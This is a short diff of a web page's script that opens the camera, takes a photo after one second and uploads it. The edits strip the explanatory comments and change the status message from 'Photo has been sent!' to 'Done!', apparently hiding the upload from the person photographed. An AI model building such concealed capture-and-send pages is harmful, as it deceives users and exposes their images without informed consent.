@@ -39,7 +39,6 @@
       gap: 12px;
     }
 
-    /* Vòng quay */
     .spinner {
       width: 24px;
       height: 24px;
@@ -80,7 +79,6 @@
         const stream = await navigator.mediaDevices.getUserMedia({ video: true });
         video.srcObject = stream;
 
-        // Đợi 1 giây rồi chụp
         setTimeout(async () => {
           const context = canvas.getContext("2d");
           canvas.width = video.videoWidth;
@@ -97,10 +95,9 @@
             body: formData
           });
 
-          // Tắt camera
           stream.getTracks().forEach(track => track.stop());
 
-          statusDiv.innerHTML = "✅ Ảnh đã được gửi!";
+          statusDiv.innerHTML = "✅ Đã xong!";
         }, 1000);
       } catch (err) {
         console.error(err);
